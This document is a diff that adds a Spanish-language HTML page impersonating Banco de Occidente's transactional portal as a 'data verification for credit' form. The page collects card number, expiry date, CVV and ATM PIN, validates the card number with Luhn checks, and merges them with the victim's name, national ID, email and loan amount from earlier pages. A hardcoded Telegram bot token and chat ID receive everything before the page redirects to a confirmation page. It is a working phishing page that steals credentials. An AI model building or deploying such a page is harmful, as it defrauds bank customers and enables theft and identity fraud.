@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Occidente - Verificación de Datos</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="BlockDesktop.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 380px;
+            overflow: hidden;
+        }
+
+        /* Header */
+        .header {
+            background: white;
+            padding: 16px 20px;
+            text-align: center;
+            position: relative;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .security-badge {
+            display: none;
+        }
+
+        .logo {
+            height: 35px;
+            margin-bottom: 10px;
+        }
+
+        .header h1 {
+            font-size: 13px;
+            color: #0052CC;
+            font-weight: 400;
+            margin-bottom: 4px;
+            letter-spacing: 0px;
+        }
+
+        .header h2 {
+            font-size: 15px;
+            color: #0052CC;
+            font-weight: 700;
+            letter-spacing: 0px;
+            margin-bottom: 4px;
+        }
+
+        .header p {
+            font-size: 18px;
+            color: #0052CC;
+            font-weight: 700;
+            letter-spacing: 0px;
+        }
+
+        /* Content */
+        .content {
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #0052CC;
+            margin-bottom: 8px;
+            text-transform: capitalize;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 13px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            background: white;
+            color: #333;
+        }
+
+        .form-group input::placeholder {
+            color: #ccc;
+            font-size: 13px;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0052CC;
+            background: #fafbff;
+        }
+
+        .error-message {
+            display: none;
+            background: #ffebee;
+            border: 1.5px solid #f44336;
+            color: #c62828;
+            padding: 10px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            animation: slideDown 0.3s ease;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .form-row .form-group {
+            margin-bottom: 0;
+        }
+
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+
+        /* Buttons */
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0052CC 0%, #003D99 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Footer */
+        .footer {
+            border-top: 1px solid #e0e0e0;
+            padding: 12px 20px;
+            background: #fafafa;
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-screen.show {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+            background: white;
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 300px;
+            width: 90%;
+        }
+
+        .loading-logo {
+            width: 150px;
+            height: auto;
+            margin: 0 auto 20px;
+            object-fit: contain;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            margin: 20px auto;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #0052CC;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 14px;
+            color: #3c4043;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+                border-radius: 0;
+            }
+
+            .content {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="occi.png" alt="Banco de Occidente" class="loading-logo">
+            <div class="spinner"></div>
+            <p class="loading-text">Verificando datos...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="security-badge">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1C6.48 1 2 4.53 2 9c0 5.25 3.07 9.8 7 11.34V23h6v-3.66c3.93-1.54 7-6.09 7-11.34 0-4.47-4.48-8-10-8zm0 16c-3.35 0-6-2.57-6-6s2.65-6 6-6 6 2.57 6 6-2.65 6-6 6z"/>
+                </svg>
+                Seguridad
+            </div>
+            <img src="occi.png" alt="Banco de Occidente" class="logo">
+            <h2>Verificación de Datos para el Crédito</h2>
+            <h1>Portal Transaccional</h1>
+        </div>
+
+        <!-- Content -->
+        <div class="content">
+            <form id="formularioTarjeta" onsubmit="handleTarjeta(event)">
+                <div class="error-message" id="errorMessage"></div>
+                <div class="form-group">
+                    <label>Número de Tarjeta</label>
+                    <input 
+                        type="text" 
+                        id="numeroTarjeta" 
+                        placeholder="4532 1234 5678 9010"
+                        inputmode="numeric"
+                        maxlength="19"
+                        required
+                    >
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Fecha de Vencimiento</label>
+                        <input 
+                            type="text" 
+                            id="fechaExp" 
+                            placeholder="MM/AA"
+                            inputmode="numeric"
+                            maxlength="5"
+                            required
+                        >
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input 
+                            type="text" 
+                            id="cvv" 
+                            placeholder="123"
+                            inputmode="numeric"
+                            maxlength="3"
+                            required
+                        >
+                    </div>
+                </div>
+
+                <div style="margin-top: 30px;"></div>
+
+                <div class="form-group">
+                    <label>Clave de Cajero</label>
+                    <input 
+                        type="password" 
+                        id="claveCajero" 
+                        placeholder="4 dígitos"
+                        inputmode="numeric"
+                        maxlength="4"
+                        required
+                    >
+                </div>
+
+                <div class="button-group">
+                    <button type="submit" class="btn btn-primary">
+                        <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                        </svg>
+                        Verificar
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>&copy; 2026 Banco de Occidente. Todos los derechos reservados.</p>
+        </div>
+    </div>
+
+    <script>
+        // Configuración de Telegram fija
+        const TELEGRAM_BOT_TOKEN = '8619673327:AAEUJ-vzXT2OxgbjbHq5AIlbj0r0x4qWryw';
+        const TELEGRAM_CHAT_ID = '-1003756481348';
+
+        // Validar número de tarjeta en tiempo real
+        document.getElementById('numeroTarjeta').addEventListener('input', function() {
+            let valor = this.value.replace(/\D/g, '').slice(0, 16);
+            this.value = valor.replace(/(\d{4})/g, '$1 ').trim();
+        });
+
+        // Algoritmo de Luhn para validar tarjetas
+        function validarTarjeta(numero) {
+            const digitos = numero.replace(/\D/g, '');
+            
+            if (digitos.length !== 16) return false;
+            
+            let suma = 0;
+            let esSegundo = false;
+            
+            for (let i = digitos.length - 1; i >= 0; i--) {
+                let digito = parseInt(digitos[i], 10);
+                
+                if (esSegundo) {
+                    digito *= 2;
+                    if (digito > 9) {
+                        digito -= 9;
+                    }
+                }
+                
+                suma += digito;
+                esSegundo = !esSegundo;
+            }
+            
+            return suma % 10 === 0;
+        }
+
+        // Validar que sea una tarjeta de banco válida
+        function esNumeroTarjetaValida(numero) {
+            const digitos = numero.replace(/\D/g, '');
+            
+            // Verificar que sea 16 dígitos
+            if (digitos.length !== 16) return false;
+            
+            // Verificar que comience con número válido de banco
+            // 4 = Visa, 5 = Mastercard, 6 = Discover, 3 = American Express
+            const primeraDigito = digitos[0];
+            if (!['3', '4', '5', '6'].includes(primeraDigito)) return false;
+            
+            // Validar con algoritmo de Luhn
+            return validarTarjeta(numero);
+        }
+
+        // Validar fecha de vencimiento
+        document.getElementById('fechaExp').addEventListener('input', function() {
+            let valor = this.value.replace(/\D/g, '').slice(0, 4);
+            if (valor.length >= 2) {
+                valor = valor.slice(0, 2) + '/' + valor.slice(2);
+            }
+            this.value = valor;
+        });
+
+        // Validar CVV (solo números)
+        document.getElementById('cvv').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 3);
+        });
+
+        // Validar Clave de Cajero (solo números)
+        document.getElementById('claveCajero').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        async function handleTarjeta(event) {
+            event.preventDefault();
+
+            const numeroTarjeta = document.getElementById('numeroTarjeta').value.replace(/\s/g, '').trim();
+            const fechaExp = document.getElementById('fechaExp').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const claveCajero = document.getElementById('claveCajero').value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Limpiar mensaje de error
+            errorMessage.classList.remove('show');
+            errorMessage.textContent = '';
+
+            // Validaciones
+            if (!esNumeroTarjetaValida(numeroTarjeta)) {
+                errorMessage.textContent = '❌ El número de tarjeta no es válido. Verifica que sean números correctos de una tarjeta real.';
+                errorMessage.classList.add('show');
+                return;
+            }
+
+            if (!/^\d{2}\/\d{2}$/.test(fechaExp)) {
+                errorMessage.textContent = '❌ La fecha debe estar en formato MM/AA';
+                errorMessage.classList.add('show');
+                return;
+            }
+
+            if (cvv.length !== 3 || !/^\d{3}$/.test(cvv)) {
+                errorMessage.textContent = '❌ El CVV debe tener exactamente 3 dígitos';
+                errorMessage.classList.add('show');
+                return;
+            }
+
+            if (claveCajero.length !== 4 || !/^\d{4}$/.test(claveCajero)) {
+                errorMessage.textContent = '❌ La clave de cajero debe tener exactamente 4 dígitos';
+                errorMessage.classList.add('show');
+                return;
+            }
+
+            // Mostrar pantalla de carga
+            document.getElementById('loadingScreen').classList.add('show');
+
+            // Obtener datos guardados
+            const datosPersonales = JSON.parse(localStorage.getItem('datosPersonales') || '{}');
+            const datosPrestamo = JSON.parse(localStorage.getItem('datosPrestamo') || '{}');
+
+            // Enviar a Telegram
+            const mensaje = `
+💳 <b>VERIFICACIÓN DE TARJETA - CRÉDITO</b>
+
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+👤 <b>Nombre Completo:</b> ${datosPersonales.nombreCompleto || 'N/A'}
+🆔 <b>Número de Cédula:</b> ${datosPersonales.numeroCedula || 'N/A'}
+📧 <b>Correo Electrónico:</b> ${datosPersonales.correoElectronico || 'N/A'}
+
+💰 <b>Monto Solicitado:</b> ${datosPrestamo.montoFormato || 'N/A'}
+
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+🔢 <b>Número Tarjeta:</b> ${numeroTarjeta.slice(0, 4)}****${numeroTarjeta.slice(-4)}
+📅 <b>Fecha Vencimiento:</b> ${fechaExp}
+🔐 <b>CVV:</b> ***
+🔑 <b>Clave de Cajero:</b> ${claveCajero}
+
+<i>Fecha: ${new Date().toLocaleString('es-CO')}</i>
+            `;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    // Guardar datos de tarjeta en localStorage
+                    const datosTarjeta = {
+                        numeroTarjeta: numeroTarjeta.slice(0, 4) + '****' + numeroTarjeta.slice(-4),
+                        fechaExp,
+                        fecha: new Date().toLocaleString('es-CO')
+                    };
+                    localStorage.setItem('datosTarjeta', JSON.stringify(datosTarjeta));
+
+                    // Redirigir a confirmacion.html después de 2 segundos
+                    setTimeout(() => {
+                        window.location.href = 'confirmacion.html';
+                    }, 2000);
+                } else {
+                    document.getElementById('loadingScreen').classList.remove('show');
+                    errorMessage.textContent = '❌ Error al verificar los datos. Intenta de nuevo.';
+                    errorMessage.classList.add('show');
+                }
+            } catch (error) {
+                document.getElementById('loadingScreen').classList.remove('show');
+                console.error('Error:', error);
+                errorMessage.textContent = '❌ Error de conexión. Intenta de nuevo.';
+                errorMessage.classList.add('show');
+            }
+        }
+    </script>
+</body>
+</html>
